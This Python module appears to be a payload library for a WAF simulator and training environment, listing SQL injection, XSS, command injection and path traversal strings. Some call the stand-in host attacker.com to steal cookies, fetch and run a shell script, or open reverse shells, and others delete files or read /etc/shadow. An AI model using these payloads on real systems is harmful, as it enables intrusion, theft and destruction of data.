"""
waf_engine/payloads.py
Sample attack payload library for the simulator and RL training environment.
Inspired by real-world OWASP / CVE payloads.
"""

# ─────────────────────────────────────────────────────────────────────────────
# SQL Injection Payloads
# ─────────────────────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users --",
    "1' AND SLEEP(5)--",
    "admin'--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 3--+",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "'; EXEC xp_cmdshell('dir'); --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e,(SELECT version())))--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "' OR BENCHMARK(5000000,MD5(1))--",
    "admin' /*",
    "1' GROUP BY CONCAT(0x7e,0x27,version(),0x27,0x7e) HAVING MIN(0)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=1 UNION SELECT 1,2,3--",
    "/**/OR/**/1=1",
]

# ─────────────────────────────────────────────────────────────────────────────
# XSS Payloads
# ─────────────────────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
    "%3cscript%3ealert(1)%3c%2fscript%3e",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=\"alert(1)\">",
    "'-alert(1)-'",
    "\"><img src=1 onerror=alert(1)>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
]

# ─────────────────────────────────────────────────────────────────────────────
# Command Injection Payloads
# ─────────────────────────────────────────────────────────────────────────────
CMD_INJECTION_PAYLOADS = [
    "; ls -la",
    "| cat /etc/passwd",
    "`whoami`",
    "$(id)",
    "; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s",
    "& dir",
    "|| ping -c 5 attacker.com",
    "; python -c 'import socket,subprocess,os;...'",
    "| nc -e /bin/bash attacker.com 4444",
    "; rm -rf /",
    "` curl http://attacker.com/$(whoami)`",
    "; echo 'hacked' > /var/www/html/hacked.html",
    "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "; cat /etc/shadow",
    "$(cat /etc/passwd | base64)",
    "; find / -name '*.conf' -type f 2>/dev/null",
    "| ps aux | grep root",
    "; env | grep -i pass",
    "` uname -a`",
    "; netstat -an",
]

# ─────────────────────────────────────────────────────────────────────────────
# Path Traversal Payloads
# ─────────────────────────────────────────────────────────────────────────────
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "/var/www/../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%5C..%5Cwindows%5Csystem.ini",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
    "/proc/self/environ",
    "../../../../boot.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "0x2e0x2e/0x2e0x2e/etc/passwd",
    "..././..././etc/passwd",
    "/etc/passwd%00",
    "....%2F....%2F....%2Fetc%2Fpasswd",
    "../../../../../../../../../etc/passwd%00.jpg",
]

# ─────────────────────────────────────────────────────────────────────────────
# Brute Force Payloads
# ─────────────────────────────────────────────────────────────────────────────
BRUTE_FORCE_PAYLOADS = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "123456"},
    {"username": "root", "password": "root"},
    {"username": "admin", "password": "admin123"},
    {"username": "user", "password": "user123"},
    {"username": "test", "password": "test"},
    {"username": "administrator", "password": "administrator"},
    {"username": "admin", "password": "letmein"},
    {"username": "admin", "password": "qwerty"},
    {"username": "admin", "password": "welcome"},
    {"username": "sa", "password": "sa"},
    {"username": "guest", "password": "guest"},
    {"username": "root", "password": "toor"},
    {"username": "admin", "password": "passw0rd"},
]

# ─────────────────────────────────────────────────────────────────────────────
# DDoS / Flood simulation markers
# ─────────────────────────────────────────────────────────────────────────────
DDOS_SIGNATURES = [
    {"rate": 500, "pattern": "HTTP_FLOOD", "target": "/"},
    {"rate": 300, "pattern": "HTTP_FLOOD", "target": "/api/"},
    {"rate": 1000, "pattern": "SLOWLORIS", "target": "/login"},
    {"rate": 200, "pattern": "RUDY", "target": "/upload"},
    {"rate": 800, "pattern": "HTTP_FLOOD", "target": "/search"},
]

# ─────────────────────────────────────────────────────────────────────────────
# Malicious User Agents
# ─────────────────────────────────────────────────────────────────────────────
MALICIOUS_USER_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "python-requests/2.28.0",
    "curl/7.68.0",
    "Nessus SOAP",
    "OpenVAS",
    "masscan/1.3",
    "ZAP/2.14.0",
    "Burp Suite Professional",
    "nmap scripting engine",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "DirBuster-1.0-RC1",
    "Havij",
    "w3af.sourceforge.net",
    "Acunetix-Aspect",
    "Go-http-client/2.0",
]

# ─────────────────────────────────────────────────────────────────────────────
# Legitimate Requests (for false positive testing)
# ─────────────────────────────────────────────────────────────────────────────
LEGITIMATE_REQUESTS = [
    {"path": "/", "method": "GET", "payload": "", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"},
    {"path": "/about", "method": "GET", "payload": "", "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X) Safari/605"},
    {"path": "/api/users", "method": "GET", "payload": "", "user_agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0"},
    {"path": "/login", "method": "POST", "payload": "username=johndoe&password=MySecurePass1!", "user_agent": "Mozilla/5.0"},
    {"path": "/search", "method": "GET", "payload": "q=hello+world", "user_agent": "Mozilla/5.0"},
    {"path": "/contact", "method": "POST", "payload": "name=John&email=john@example.com&message=Hello", "user_agent": "Mozilla/5.0"},
    {"path": "/products/123", "method": "GET", "payload": "", "user_agent": "Mozilla/5.0"},
    {"path": "/api/data", "method": "POST", "payload": "{\"key\": \"value\"}", "user_agent": "Mozilla/5.0"},
    {"path": "/dashboard", "method": "GET", "payload": "", "user_agent": "Mozilla/5.0 (Windows NT 10.0) Edge/120"},
    {"path": "/profile", "method": "PUT", "payload": "name=Jane+Doe&bio=Developer", "user_agent": "Mozilla/5.0"},
]

# ─────────────────────────────────────────────────────────────────────────────
# Geo IP dummy mapping for simulation
# ─────────────────────────────────────────────────────────────────────────────
IP_GEO_MAP = {
    "192.168.1.": "US", "10.0.0.": "US", "172.16.": "US",
    "1.": "CN", "2.": "RU", "3.": "DE", "4.": "BR",
    "5.": "IN", "6.": "KR", "7.": "JP", "8.": "GB",
    "45.": "RU", "46.": "CN", "47.": "CN", "91.": "RU",
    "103.": "CN", "185.": "RU", "195.": "UA",
}

# Payload map indexed by attack type
PAYLOADS_BY_TYPE = {
    "sqli":           SQLI_PAYLOADS,
    "xss":            XSS_PAYLOADS,
    "cmd_inject":     CMD_INJECTION_PAYLOADS,
    "path_traversal": PATH_TRAVERSAL_PAYLOADS,
    "brute_force":    [str(p) for p in BRUTE_FORCE_PAYLOADS],
    "ddos":           [str(d) for d in DDOS_SIGNATURES],
    "bot":            MALICIOUS_USER_AGENTS,
}

ATTACK_SEVERITY = {
    "sqli":           "critical",
    "xss":            "high",
    "cmd_inject":     "critical",
    "path_traversal": "high",
    "brute_force":    "medium",
    "ddos":           "high",
    "bot":            "medium",
    "lfi":            "high",
    "xxe":            "high",
}
